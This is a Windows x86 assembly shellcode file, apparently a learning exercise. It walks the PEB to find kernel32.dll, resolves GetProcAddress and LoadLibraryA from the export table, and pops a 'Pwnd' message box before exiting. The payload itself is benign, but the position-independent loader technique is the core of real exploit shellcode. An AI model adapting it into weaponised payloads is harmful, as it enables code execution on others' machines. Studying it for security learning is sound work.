global _start

section .text
_start:


getkernel32:
	xor ecx, ecx				; zeroing register ECX
	mul ecx						; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x030]	; PEB loaded in eax
	mov eax, [eax + 0x00c]		; LDR loaded in eax
	mov esi, [eax + 0x014]		; InMemoryOrderModuleList loaded in esi
	lodsd						; program.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd						; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]		; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]		; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0x78]		; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]		; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getProcAddress:
	inc ecx 							; ordinals increment
	lodsd								; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x50746547			; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72	; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464	; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]		; offset ordinals
	add esi, ebx 				; pointer to the name ordinals table
	mov cx, [esi + ecx * 2] 	; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]    	; ESI = Offset address table
	add esi, ebx             	; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4] 	; EDX = Pointer(offset)
	add edx, ebx             	; EDX = getProcAddress
	mov ebp, edx 				; save getProcAddress in EBP for future purpose

getLoadLibraryA:
	xor ecx, ecx 				; zeroing ecx
	push ecx 					; push 0 on stack
	push 0x41797261   			; 
	push 0x7262694c				;  AyrarbiLdaoL
	push 0x64616f4c 			;
	push esp
	push ebx 					; kernel32.dll
	call edx 					; call GetProcAddress and find LoadLibraryA address

	; EAX = LoadLibraryA address
	; EBX = Kernel32.dll address
	; EDX = GetProcAddress address 

getUser32:
	push 0x61616c6c 				;
	sub word [esp + 0x2], 0x6161 	; aalld.23resU
	push 0x642e3233 				; 
	push 0x72657355 				; 
	push esp
	call eax 						; call Loadlibrary and find User32.dll

	; EAX = User32.dll address
	; EBX = Kernel32.dll address
	; EBP = GetProcAddress address 

getMessageBox:
	push 0x6141786f 				; aAxo : 6141786f
	sub word [esp + 0x3], 0x61
	push 0x42656761					; Bega : 42656761
	push 0x7373654d					; sseM : 7373654d
	push esp
	push eax 						; User32.dll
	call ebp 						; GetProcAddress(User32.dll, MessageBoxA)

	; EAX 76C6EA71 User32.MessageBoxA
	; ECX 76C10000 OFFSET User32.#2499
	; EDX 00005A12
	; EBX 75290000 kernel32.75290000
	; ESP 0022FF74 ASCII "32.dll"
	; EBP 752E1837 kernel32.GetProcAddress
	; ESI 75344DD0 kernel32.75344DD0
	; EDI 00000000
	; EIP 004010A4 getMessa.004010A4

MessageBoxA:
	add esp, 0x010 				; clean the stack
	xor edx, edx
	xor ecx, ecx
	push edx 						
	push 'Pwnd'
	mov edi, esp
	push edx
    push 'Yess'
    mov ecx, esp
	push edx 						; hWnd = NULL
	push edi 						; the title "dnwP"
	push ecx 						; the message "sseY"
	push edx 						; uType = NULL
	call eax 						; MessageBoxA(windowhandle,msg,title,type)

Exit:
	add esp, 0x010 				; clean the stack
	push 0x61737365				; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250				; corP
	push 0x74697845				; tixE
	push esp
	push ebx
	call ebp

	xor ecx, ecx
	push ecx
	call eax


